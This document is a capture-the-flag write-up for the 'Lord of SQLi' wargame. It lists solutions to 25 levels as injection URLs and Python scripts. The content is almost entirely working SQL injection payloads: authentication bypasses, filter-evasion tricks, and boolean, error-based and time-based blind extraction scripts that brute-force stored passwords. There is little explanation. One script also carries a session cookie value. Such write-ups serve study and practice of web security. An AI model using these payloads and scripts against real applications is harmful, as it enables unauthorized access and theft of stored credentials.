# [Lord of SQLi] All Problems - Writeup

## 1. Gremlin
[http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=%27||1%23](http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=%27||1%23)

___

## 2. Cobolt
[http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin%27%23](http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin%27%23)

___

## 3. Goblin
[http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0||id=0x61646D696E](http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0||id=0x61646D696E)

___

## 4. Orc
``` python
import urllib
import httplib
 
def main():
    HTTP=httplib.HTTPConnection("los.eagle-jump.org")
    Url="/orc_47190a4d33f675a601f8def32df2583a.php?pw="
    Headers={"Cookie":"PHPSESSID=**secret**"}
    Passwd=""
 
    for i in range(len(Passwd)+1,100):
        for c in range(ord("0"),ord("9")+1)+range(ord("a"),ord("z")+1)+range(128,129):
            if c == 128:
                print "[!] Not Found"
                print "[*] Password : %s~" % Passwd
                return False
 
            Payload="'||id='admin'&&mid(pw,%d,1)=0x%x#" % (i,c)
            HTTP.request("GET",Url+urllib.quote(Payload),"",Headers)
 
            if "Hello admin" in HTTP.getresponse().read():
                Passwd+=chr(c)
                print "[+] Found : %c" % c
 
                HTTP.request("GET",Url+urllib.quote(Passwd),"",Headers)
                if "Hello admin" in HTTP.getresponse().read():
                    print "[*] Password : %s" % Passwd
                    return True
 
                break
 
if __name__ == "__main__":
    main()
```

[http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844](http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844)

___

## 5. Wolfman
[http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=%27||id=%27admin](http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=%27||id=%27admin)

___

## 6. Darkelf
[http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=%27||id=%27admin](http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=%27||id=%27admin)

___

## 7. Orge
[http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=%27||id=%27admin%27%26%26@x:=pw+union+select+@x+limit+1,1%23](http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=%27||id=%27admin%27%26%26@x:=pw+union+select+@x+limit+1,1%23)

[http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec](http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec)

___

## 8. Troll
[http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN](http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN)

___

## 9. Vampire
[http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=ADMIN](http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=ADMIN)

___

## 10. Skeleton
[http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=%27||id=%27admin%27%23](http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=%27||id=%27admin%27%23)

___

## 11. Golem
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in "0123456789abcdefghijklmnopqrstuvwxyz":
        Payload="' || id like 'admin' && ascii(mid(pw,"+str(i)+",1)) like '"+str(ord(a))
        Payload=urllib.quote(Payload)
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=**secret**"}
        HTTP.request("GET","/golem_39f3348098ccda1e71a4650f40caa037.php?pw="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if "Hello admin" in Result:
            Pw+=str(a)
            print "["+str(i)+"] Find : "+str(a)
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=88e3137f](http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=88e3137f)

___

## 12. Darkknight
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in "0123456789abcdefghijklmnopqrstuvwxyz":
        Payload="1 || id like 0x61646D696E && mid(pw,"+str(i)+",1) like "+str(hex(ord(a)))
        Payload=urllib.quote(Payload)
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=**secret**"}
        HTTP.request("GET","/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if "Hello admin" in Result:
            Pw+=str(a)
            print "["+str(i)+"] Find : "+str(a)
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f](http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f)

___

## 13. Bugbear
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in "0123456789abcdefghijklmnopqrstuvwxyz":
        Payload="1 || id regexp concat(char(97),char(100),char(109),char(105),char(110)) && mid(pw,"+str(i)+",1) regexp "+str(bin(ord(a)))
        Payload=urllib.quote(Payload)
        Payload=Payload.replace("%20","%0a")
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=**secret**"}
        HTTP.request("GET","/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if "Hello admin" in Result:
            Pw+=str(a)
            print "["+str(i)+"] Find : "+str(a)
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?pw=735c2773](http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?pw=735c2773)

___

## 14. Giant
[http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0b](http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0b)

___

## 15. Assassin
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in "0123456789abcdefghijklmnopqrstuvwxyz_":
        Payload=Pw+str(a)+"%"
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=**secret**"}
        HTTP.request("GET","/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if "Hello " in Result:
            Pw+=str(a)
            print "["+str(i)+"] Find : "+str(a)
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=832edd10](http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=832edd10)

___

## 16. Zombie Assassin
[http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00%27||1%23](http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00%27||1%23)

___

## 17. Succubus
[http://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php?id=\&pw=||1%23](http://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php?id=\&pw=||1%23)

___

## 18. Nightmare
[http://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=%27=1%29;%00](http://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=%27=1%29;%00)

___

## 19. Xavis
[http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27||id=%27admin%27%26%26@x:=hex%28pw%29+union+select+@x%23](http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27||id=%27admin%27%26%26@x:=hex%28pw%29+union+select+@x%23)
```
000000B8000000F9000000C5000000B0000000C6000000D0000000C4000000A1000000A4000000BB
```

[http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%C2%B8%C3%B9%C3%85%C2%B0%C3%86%C3%90%C3%84%C2%A1%C2%A4%C2%BB](http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%C2%B8%C3%B9%C3%85%C2%B0%C3%86%C3%90%C3%84%C2%A1%C2%A4%C2%BB)

___

## 20. Dragon
[http://los.eagle-jump.org/dragon_7ead3fe768221c5d34bc42d518130972.php?pw=%0a%20and%20false%20or%20id=%27admin](http://los.eagle-jump.org/dragon_7ead3fe768221c5d34bc42d518130972.php?pw=%0a%20and%20false%20or%20id=%27admin)

___

## 21. Iron Golem
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in range(ord("a"),ord("z")+1)+range(ord("0"),ord("9")+1)+range(33,128):
        Payload="%27||if(substr(pw,"+str(i)+",1)="+str(hex(a))+",1,(select+1+union+select+2))%23"
        print Payload
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=hu11kjoc33a1k6puht8em5s505"}
        HTTP.request("GET","/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if not "Subquery" in Result:
            Pw+=chr(a)
            print "["+str(i)+"] Find : "+Pw
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw=%21%21%21%21](http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw=%21%21%21%21)

___

## 22. Dark Eyes
``` python
import urllib
import httplib
 
Pw=""
for i in range(1,100):
    isFind=False
    for a in range(ord("a"),ord("z")+1)+range(ord("0"),ord("9")+1)+range(33,128):
        Payload="%27+or+id=%27admin%27+and+(select+mid(pw,"+str(i)+",1)="+str(hex(a))+"+union+select+true)%23"
        print Payload
        HTTP=httplib.HTTPConnection("los.eagle-jump.org")
        Param=urllib.urlencode({})
        Headers={"Cookie":"PHPSESSID=hu11kjoc33a1k6puht8em5s505"}
        HTTP.request("GET","/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="+Payload,Param,Headers)
        Result=HTTP.getresponse().read()
        if Result!="":
            Pw+=chr(a)
            print "["+str(i)+"] Find : "+Pw
            isFind=True
            break
    if isFind != True:
        print "Password is "+Pw
        break
```

[http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=5a2f5d3c](http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=5a2f5d3c)

___

## 23. Hell Fire
This challenge is broken.

[http://los.eagle-jump.org/hell_fire_d349b00f6bbf3003de0d283143cbc84b.php](http://los.eagle-jump.org/hell_fire_d349b00f6bbf3003de0d283143cbc84b.php)

___

## 24. Evil Wizard
This challenge is broken.

[http://los.eagle-jump.org/evil_wizard_6d97f2ce1c9e5b84721ac30a656ad109.php](http://los.eagle-jump.org/evil_wizard_6d97f2ce1c9e5b84721ac30a656ad109.php)

___

## 25. umaru
``` python
import urllib.parse, urllib.request
import time

PHPSESSID = '**secret**'

def reset():
	url = 'http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=1'
	headers = {
		'User-Agent': 'Mozilla/5.0',
		'Cookie':'PHPSESSID=' + PHPSESSID
	}
	req = urllib.request.Request(url, None, headers)
	res = urllib.request.urlopen(req).read().decode()
	return res.startswith('\nreset ok')

def inject(flag):
	url = 'http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=' \
		'(select+1+union+select+sleep(3*(flag+like+%27' + flag + '%%27)))'
	headers = {
		'User-Agent': 'Mozilla/5.0',
		'Cookie':'PHPSESSID=' + PHPSESSID
	}
	t = time.time()
	req = urllib.request.Request(url, None, headers)
	res = urllib.request.urlopen(req).read().decode()
	return res == '\n' and time.time() - t > 3

def main():
	print('reset:', 'success' if reset() else 'fail')
	flag = ''
	for i in range(16):
		for c in '0123456789abcdef':
			if inject(flag + c):
				flag += c
				print('flag:', flag)
				break
			else:
				print('try:', c)

if __name__ == '__main__':
	main()
```

[http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=1651be4010cb7153](http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=1651be4010cb7153)